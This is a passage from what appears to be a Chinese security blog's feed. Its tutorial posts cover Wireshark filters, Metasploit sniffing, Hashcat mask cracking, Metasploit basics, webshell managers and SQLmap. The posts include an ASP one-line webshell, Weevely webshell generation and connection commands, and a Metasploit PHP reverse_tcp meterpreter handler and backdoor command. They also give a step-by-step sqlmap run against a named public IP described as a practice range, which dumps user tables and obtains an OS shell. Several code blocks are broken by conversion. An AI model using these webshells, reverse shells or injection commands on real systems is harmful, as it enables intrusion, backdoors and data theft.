<li>tcp.port == 25 显示端口号为25的数据包</li>
<li>tcp.dstport == 25 显示目的tcp端口号为25的数据包</li>
<li>http.response.code==302 显示http响应状态码为302的数据包</li>
<li>tcp contains “http”<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618211329320.png" alt="image-20210618211329320"></li>
</ul>
</li>
<li>http.host contains “192.168.88.132” 包含主机的数据包</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="MSF嗅探数据包分析"><a href="#MSF嗅探数据包分析" class="headerlink" title="MSF嗅探数据包分析"></a>MSF嗅探数据包分析</h1><blockquote>
<ul>
<li><h2 id="1、MSF开启嗅探数据"><a href="#1、MSF开启嗅探数据" class="headerlink" title="1、MSF开启嗅探数据"></a>1、MSF开启嗅探数据</h2><ul>
<li><h3 id="sniffer-interfaces"><a href="#sniffer-interfaces" class="headerlink" title="sniffer_interfaces"></a>sniffer_interfaces</h3><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210619172639695.png" alt="image-20210619172639695"></li>
</ul>
</li>
<li><h3 id="sniffer-start-2"><a href="#sniffer-start-2" class="headerlink" title="sniffer_start 2"></a>sniffer_start 2</h3></li>
<li><h3 id="sniffer-stop-2"><a href="#sniffer-stop-2" class="headerlink" title="sniffer_stop 2"></a>sniffer_stop 2</h3></li>
<li><h2 id="sniffer-dump-2-名称-pcap"><a href="#sniffer-dump-2-名称-pcap" class="headerlink" title="sniffer_dump 2 名称.pcap"></a>sniffer_dump 2 名称.pcap</h2><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210619173617848.png" alt="image-20210619173617848"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210619173631541.png" alt="image-20210619173631541"></li>
</ul>
</li>
</ul>
</li>
<li><h2 id="2、wireshark分析数据包"><a href="#2、wireshark分析数据包" class="headerlink" title="2、wireshark分析数据包"></a>2、wireshark分析数据包</h2><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210619173651871.png" alt="image-20210619173651871"></li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="WSExplorer分析"><a href="#WSExplorer分析" class="headerlink" title="WSExplorer分析"></a>WSExplorer分析</h1><blockquote>
<p>可以进行软件包分析</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210619174229430.png" alt="image-20210619174229430"></p>
</blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>嗅探工具</tag>
        <tag>wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title>【破解工具】Hashcat加密破解</title>
    <url>/posts/28.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="hash密码破解工具-Hashcat"><a href="#hash密码破解工具-Hashcat" class="headerlink" title="hash密码破解工具 - Hashcat"></a>hash密码破解工具 - Hashcat</h1><blockquote>
<p>下载地址：<a href="https://hashcat.net/files/hashcat-6.2.2.7z（使用前提是你在线解密工具不行时）" target="_blank" rel="noopener">https://hashcat.net/files/hashcat-6.2.2.7z（使用前提是你在线解密工具不行时）</a></p>
<p>我的博客：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></p>
</blockquote>
<h1 id="扫描模式"><a href="#扫描模式" class="headerlink" title="扫描模式"></a>扫描模式</h1><blockquote>
<ul>
<li>Mode<ul>
<li>0代号<strong>Straight（字典破解）：基于字典进行破解</strong></li>
<li>1代号<strong>Combination（组合破解）：基于多个字典进行破解</strong></li>
<li>3代号<strong>Brute-force（掩码暴力破解）：基于掩码设置进行破解</strong></li>
<li>6代号<strong>Hybrid Wordlist + Mask（字典+掩码破解）</strong></li>
<li>7代号<strong>Hybrid Mask + Wordlist （掩码+字典破解）</strong></li>
</ul>
</li>
<li>? | Charset<br>===+=========<br>l | abcdefghijklmnopqrstuvwxyz  （26个小写字母）<br>u | ABCDEFGHIJKLMNOPQRSTUVWXYZ （26个大写字母）<br>d | 0123456789 （0-9数字）446515184<br>h | 0123456789abcdef （数字和小写字母）<br>H | 0123456789ABCDEF（数字和大写字母）<br>s |  !”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~ （特殊字符）<br>a | ?l?u?d?s （键盘上所有可见的字符）<br>b | 0x00 - 0xff（可能是用来匹配像空格这样密码的）<ul>
<li>格式：八位数字密码：?d?d?d?d?d?d?d?d</li>
<li>格式：八位未知密码：?a?a?a?a?a?a?a?a</li>
<li>格式：前四位为大写字母，后四位为数字：?u?u?u?u?d?d?d?d</li>
<li>格式：前四位为数字或者是小写字母，后四位为大写字母或者数字：?h?h?h?h?H?H?H?H</li>
<li>格式：前三个字符未知，中间为admin，后三位未知：?a?a?aadmin?a?a?a</li>
<li>6-8位字母密码：–increment –increment-min 6 –increment-max 8 ?l?l?l?l?l?l?l?l</li>
<li>6-8位数字+小写字母密码：–increment –increment-min 6 –increment-max 8 ?h?h?h?h?h?h?h?h</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h1><blockquote>
<ul>
<li>-a 指定要使用的破解模式，其值参考后面对参数。“-a 0”字典工具，“-a 1”组合攻击；“-a 3”掩码攻击。</li>
<li>-m 指定要破解的hash mode，如果不指定类型，则默认是MD5</li>
<li>-o 指定破解成功后的hash及所对应的明文密码的存放位置，可以用它把破解成功的hash写到指定的文件中</li>
<li>–force 忽略破解过程中的警告信息，跑单条hash可能需要加上此选项</li>
<li>–show 显示已经破解的hash及该hash所对应的明文</li>
<li>–increment 启用增量破解模式，你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程</li>
<li>–increment-min 密码最小长度，后面直接等于一个整数即可，配置increment模式一起使用</li>
<li>–increment-max 密码最大长度，同上</li>
<li>–outfile-format 指定破解结果的输出格式id，默认是3</li>
</ul>
</blockquote>
<h1 id="实例破解"><a href="#实例破解" class="headerlink" title="实例破解"></a>实例破解</h1><blockquote>
<ul>
<li><p>一、数字破解（8位：13245786）md5:<strong>38cf51764f772c1ab70362efa4a1da67</strong></p>
<ul>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210617204428793.png" alt="image-20210617204428793"></p>
</li>
<li><p><strong>命令 ：（意思就是说6-8之间的数字进行掩码破解）</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 0 38cf51764f772c1ab70362efa4a1da67 --increment --increment-min 6 --increment-max 8 ?d?d?d?d?d?d?d?d</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210617204751135.png" alt="image-20210617204751135"></p>
</li>
</ul>
</li>
<li><p>二、小写字母和数字（8位：4a1b2a2c）md5:<strong>9ab70b87e486f5430537b5547c976037</strong></p>
<ul>
<li><p><strong>命令：（6-8位的小写字母和数字掩码破解）</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 0 9ab70b87e486f5430537b5547c976037 --increment --increment-min 1 --increment-max 8 ?h?h?h?h?h?h?h?h</span><br></pre></td></tr></table></figure></div>

<p><img src="C:%5CUsers%5C23242%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210617212252552.png" alt="image-20210617212252552"></p>
</li>
</ul>
</li>
<li><p><strong>三、任意字符破解(4位：A1b;)md5:f67550e2ddf5eeba1662f8ee8974bf5b</strong></p>
<ul>
<li><p><strong>命令（破解时间过长，我就用四位做示例，四位数只用几秒）</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 0 f67550e2ddf5eeba1662f8ee8974bf5b --increment --increment-min 1 --increment-max 4 ?a?a?a?a</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210617212617592.png" alt="image-20210617212617592"></p>
</li>
</ul>
</li>
<li><p><strong>字典破解</strong>：-a 0是指字典破解模式 ， -o是输出结果到文件中</p>
<ul>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210617212821487.png" alt="image-20210617212821487"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210617213108380.png" alt="image-20210617213108380"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210617213345945.png" alt="image-20210617213345945"></p>
</li>
<li><p>命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">hashcat -m 0 -a 0 .&#x2F;dict&#x2F;hash.txt .&#x2F;dict&#x2F;password.txt -o result.txt</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210617213500840.png" alt="image-20210617213500840"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210617213550991.png" alt="image-20210617213550991"></p>
</li>
</ul>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>爆破工具</tag>
        <tag>Hashcat</tag>
      </tags>
  </entry>
  <entry>
    <title>【漏洞工具】Metasploit框架基本命令</title>
    <url>/posts/29.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="MSF—基础命令"><a href="#MSF—基础命令" class="headerlink" title="MSF—基础命令"></a>MSF—基础命令</h1><blockquote>
<ul>
<li>一、开启数据库：service postgresql start  (作用是加快开启速度)<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210616150345672.png" alt="image-20210616150345672"></li>
</ul>
</li>
<li><strong>二、开启MSF： msfconsole</strong></li>
<li><strong>三、help命令</strong></li>
</ul>
</blockquote>
<h1 id="常规模块"><a href="#常规模块" class="headerlink" title="常规模块"></a>常规模块</h1><blockquote>
<ul>
<li>show payloads（载荷）<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210616222126173.png" alt="image-20210616222126173"></li>
</ul>
</li>
<li>show auxiliary （辅助）</li>
<li>show exploits（利用）</li>
<li>命名规则：操作系统/服务/名称  <strong>windows/smb/ms17_010_eternalblue</strong></li>
<li>显示模块信息：<strong>info windows/smb/ms17_010_eternalblue</strong></li>
<li>根据名称搜索：<strong>search ms17</strong></li>
<li>返回：back</li>
<li>联合搜索-根据类型和名称搜索：  search type:auxiliary name:ms17</li>
<li>hosts查看主机</li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618081829430.png" alt="image-20210618081829430"></li>
<li>hosts -c mac查看会话主机</li>
</ul>
</blockquote>
<h1 id="MSF-扫描模块"><a href="#MSF-扫描模块" class="headerlink" title="MSF - 扫描模块"></a>MSF - 扫描模块</h1><blockquote>
<ul>
<li><p><strong>信息收集</strong></p>
<ul>
<li><p>一、<strong>可查网站</strong><a href="https://www.benmi.com/whois/zkaq.org" target="_blank" rel="noopener">https://www.benmi.com/whois/zkaq.org</a></p>
</li>
<li><p>二、<strong>kali自带whois</strong></p>
<ul>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210616205344226.png" alt="image-20210616205344226"></p>
</li>
<li><p>三、<strong>在线密码生成器：<a href="https://www.bugku.com/mima/" target="_blank" rel="noopener">https://www.bugku.com/mima/</a></strong></p>
</li>
<li><p>四、开源在线工具利用phpstudy运行：<a href="https://github.com/Acmesec/PoCBox" target="_blank" rel="noopener">https://github.com/Acmesec/PoCBox</a></p>
</li>
<li><p>五、DNS查询</p>
<ul>
<li><p>nslookup</p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210618085408521.png" alt="image-20210618085408521"></p>
</li>
<li><p><strong>Dnsenum来找dns</strong></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210618130309657.png" alt="image-20210618130309657"></p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>六、<strong>MSF - 中可以使用db_Nmap和实际上的Nmap差不多</strong></p>
<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618085641631.png" alt="image-20210618085641631"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618085821802.png" alt="image-20210618085821802"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618085902626.png" alt="image-20210618085902626"></li>
</ul>
</li>
<li><p><strong>七、自动化扫描插件 wmap</strong></p>
<ul>
<li><p><strong>laod wmap 加载插件</strong></p>
<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618090334470.png" alt="image-20210618090334470"></li>
</ul>
</li>
<li><p>查看模块命令 </p>
<p>​    <img src="https://gylq.gitee.io/cloudimages/img/image-20210618090321922.png" alt="image-20210618090321922"></p>
</li>
<li><p><strong>wmap_sites -a url 添加目标</strong></p>
</li>
<li><p><strong>wmap_targets -t url 添加目标URL地址</strong></p>
</li>
<li><p><strong>wmap_run -e 测试目标</strong></p>
</li>
<li><p><strong>wmap_vulns 查看漏洞详细信息</strong></p>
</li>
</ul>
</li>
<li><p><strong>kali自带漏洞库 - searchsploit</strong></p>
<ul>
<li>离线漏洞数据库搜索工具<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618091341979.png" alt="image-20210618091341979"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618091806714.png" alt="image-20210618091806714"></li>
</ul>
</li>
<li><strong>漏洞数据库使用手册</strong>：<a href="https://www.exploit-db.com/searchsploit" target="_blank" rel="noopener">https://www.exploit-db.com/searchsploit</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>漏洞工具</tag>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>【入侵工具】webshell管理工具基础使用</title>
    <url>/posts/27.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="测试靶场"><a href="#测试靶场" class="headerlink" title="测试靶场"></a>测试靶场</h1><blockquote>
<p>环境：<a href="http://59.63.200.79:8804/" target="_blank" rel="noopener">http://59.63.200.79:8804/</a></p>
</blockquote>
<h1 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h1><blockquote>
<ul>
<li><p><strong>小马：上传文件，体积较小，文件管理</strong>（例如sqlmap的管理os-shell里面就会帮你上传小马）</p>
</li>
<li><p><strong>大马： 文件体积较大、功能齐全、能够提权、操作数据库等</strong></p>
</li>
<li><p><strong>一句话木马（主流）：功能强大、客户端直接管理</strong>   </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">例如：</span><br><span class="line">asp的一句话木马：&lt;% execute request[&#39;a&#39;]%&gt;</span><br><span class="line">php的一句话木马：</span><br></pre></td></tr></table></figure></div>
</li>
</ul>
</blockquote>
<h1 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h1><blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210616132010184.png" alt="image-20210616132010184"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210616132124651.png" alt="image-20210616132124651"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210616132150963.png" alt="image-20210616132150963"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210616132342456.png" alt="image-20210616132342456"></p>
</blockquote>
<h1 id="中国蚁剑"><a href="#中国蚁剑" class="headerlink" title="中国蚁剑"></a>中国蚁剑</h1><blockquote>
<ul>
<li>安装：<a href="https://github.com/yzddmr6/As-Exploits" target="_blank" rel="noopener">https://github.com/yzddmr6/As-Exploits</a></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210616132526774.png" alt="image-20210616132526774"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210616132611141.png" alt="image-20210616132611141"></li>
</ul>
</blockquote>
<h1 id="Kali-Linux-shell-Weevely"><a href="#Kali-Linux-shell-Weevely" class="headerlink" title="Kali Linux shell Weevely"></a>Kali Linux shell Weevely</h1><blockquote>
<p>安装：<a href="https://github.com/epinna/weevely3" target="_blank" rel="noopener">https://github.com/epinna/weevely3</a>   (一般kali linux都自带了)</p>
<ul>
<li><p><strong>1、生成shell</strong></p>
<ul>
<li><strong>命令： weevely generate 123 shell.php</strong></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210616135707456.png" alt="image-20210616135707456"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210616135743703.png" alt="image-20210616135743703"></li>
</ul>
</li>
<li><p><strong>2、连接shell</strong></p>
<ul>
<li>命令：weevely <a href="http://59.63.200.79:8804/shell.php" target="_blank" rel="noopener">http://59.63.200.79:8804/shell.php</a> 123</li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210616140415117.png" alt="image-20210616140415117"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210616140714901.png" alt="image-20210616140714901"></li>
</ul>
</li>
<li><p>基本模块使用</p>
<ul>
<li><p>1、system_info</p>
</li>
<li><p><img src="C:%5CUsers%5C23242%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210616141257686.png" alt="image-20210616141257686"></p>
</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="生成meterpreter会话"><a href="#生成meterpreter会话" class="headerlink" title="生成meterpreter会话"></a>生成meterpreter会话</h1><blockquote>
<ul>
<li><p><strong>MSF设置</strong></p>
<ul>
<li>use exploit/multi/handler</li>
<li>show payloads</li>
<li>set payload php/meterpreter/reverse_tcp</li>
<li>show options</li>
<li>set lhost 本机IP</li>
<li>run</li>
</ul>
</li>
<li><p>2、生成meterpreter会话</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">backdoor_meterpreter -payload php&#x2F;meterpreter&#x2F;reverse_tcp -lhost 本机ip -port 端口</span><br></pre></td></tr></table></figure></div>

</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
        <tag>漏洞工具</tag>
      </tags>
  </entry>
  <entry>
    <title>【注入工具】SQLmap实践手册</title>
    <url>/posts/66.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h1><blockquote>
<ul>
<li><p><a href="http://59.63.200.79:8804/single.php?id=1" target="_blank" rel="noopener">http://59.63.200.79:8804/single.php?id=1</a></p>
</li>
<li><p>明显存在sql注入</p>
</li>
</ul>
</blockquote>
<h1 id="基础实践sqlmap形式"><a href="#基础实践sqlmap形式" class="headerlink" title="基础实践sqlmap形式"></a>基础实践sqlmap形式</h1><blockquote>
<ul>
<li><p>工具安装地址：<a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap</a></p>
</li>
<li><p>sqlmap实战</p>
<ul>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210615202146348.png" alt="image-20210615202146348"></p>
</li>
<li><p><strong>探测出含有的注入类型</strong> </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;59.63.200.79:8804&#x2F;single.php?id&#x3D;1 --batch --threads&#x3D;10</span><br></pre></td></tr></table></figure></div>

<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210615202231495.png" alt="image-20210615202231495"></li>
</ul>
</li>
<li><p>查库 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;59.63.200.79:8804&#x2F;single.php?id&#x3D;1 --dbs --batch --threads&#x3D;10</span><br></pre></td></tr></table></figure></div>



</li>
</ul>
</li>
</ul>
<ul>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210615202426295.png" alt="image-20210615202426295"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210615202438699.png" alt="image-20210615202438699"></p>
<ul>
<li><p>查表</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;59.63.200.79:8804&#x2F;single.php?id&#x3D;1 -D cake --tables --batch --threads&#x3D;10</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210615202857064.png" alt="image-20210615202857064"></p>
</li>
<li><p>查值 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;59.63.200.79:8804&#x2F;single.php?id&#x3D;1 -D cake -T user --dump --batch --threads&#x3D;10</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210615203002794.png" alt="image-20210615203002794"></p>
</li>
<li><p>扫不出后台地址，试试能不能直接getshell</p>
</li>
<li><p>测试 –is-dba </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;59.63.200.79:8804&#x2F;single.php?id&#x3D;1 --is-dba --batch --threads&#x3D;10</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210616081257017.png" alt="image-20210616081257017"></p>
</li>
</ul>
</li>
<li><p>绝对路径 把is-dba改成–sql-shell  </p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210616081642436.png" alt="image-20210616081642436"></p>
</li>
<li><p>直接 把–sql-shell改成os-shell拿到shell了</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210616081758213.png" alt="image-20210616081758213"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210616081846898.png" alt="image-20210616081846898"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210616081946989.png" alt="image-20210616081946989"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210616082010229.png" alt="image-20210616082010229"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210616082035329.png" alt="image-20210616082035329"></p>
</li>
</ul>
</blockquote>
<h1 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h1><blockquote>
<p><strong>一、查看数据库相关信息</strong></p>
<ul>
<li><strong>–current-user 枚举当前用户</strong></li>
<li><strong>–current-db 枚举当前数据库</strong></li>
<li><strong>–dbs 枚举当前可用数据库</strong></li>
<li><strong>–is-dba 枚举当前数据库权限</strong></li>
<li><strong>–password 枚举当前数据库用户密码</strong></li>
</ul>
<p><strong>二、指纹识别</strong></p>
<ul>
<li><strong>-f  启用广泛的指纹识别</strong></li>
<li><strong>-b 检测数据库指纹</strong></li>
<li><strong>–hostname 枚举主机名称</strong></li>
</ul>
<p><strong>三、Waf识别</strong></p>
<ul>
<li><strong>–identify-waf 检测waf信息</strong></li>
</ul>
<p><strong>四、sqlmap更新</strong></p>
<ul>
<li><strong>–update 更新</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">小知识</span><br><span class="line">如果网页是http:&#x2F;&#x2F;59.63.200.79:8804&#x2F;single.php&#x2F;id&#x2F;1.html</span><br><span class="line">可能存在伪静态 也可以在javascript中 使用 alert(document.lastModified)</span><br><span class="line">直接正常注入就行</span><br><span class="line">sqlmap.py -u http:&#x2F;&#x2F;59.63.200.79:8804&#x2F;single.php&#x2F;id&#x2F;1.html</span><br></pre></td></tr></table></figure></div>

<h1 id="常见的注入方式"><a href="#常见的注入方式" class="headerlink" title="常见的注入方式"></a>常见的注入方式</h1><blockquote>
<ul>
<li><p><strong>基本操作上面已经写了。其他百度</strong></p>
</li>
<li><p><strong>-l burp.log  加载request日志</strong></p>
</li>
<li><p><strong>–batch   自动选Y</strong></p>
</li>
<li><p><strong>–smart 启发式快速判断，节约时间</strong></p>
</li>
<li><p><strong>Cookie注入</strong></p>
<ul>
<li><pre><code>--cookie &quot;id=2&quot;
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- **Post注入**</span><br><span class="line"></span><br><span class="line">  - **使用** </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
--forms 自动搜索表单信息
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 请求延时注入</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
--delay 1 
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 等级 1-5</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
--level 5
2级以上会尝试cookie
3级以上就对head注入
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 自动更换请求头</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
--user-agent
防止被人工办了
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 获取表中的数量</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
--count
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 风险等级</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
--risk 3
大于2 就开始or updatexml进行测试，可能造成更新整个表。
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- --sql-shell 数据库操作</span><br><span class="line"></span><br><span class="line">- --os-shell 系统操作</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
条件
一、测试--is-dba必须是true
二、需要知道绝对路径，利用--sql-shell
三、GPC为off，php主动转义的功能关闭
四、secure_file-priv为空

可以自动生成，上传脚本文件、后门文件
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"># 系统库注入</span><br><span class="line"></span><br><span class="line">- 表名</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;sql</span><br><span class="line">select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1;</span><br></pre></td></tr></table></figure></div></code></pre></li>
</ul>
</li>
<li><p>列名</p>
</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'a_user'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>


</blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
        <tag>漏洞工具</tag>
      </tags>
  </entry>
  <entry>
    <title>【漏洞工具】BEEF基本启动方式</title>
    <url>/posts/75.html</url>
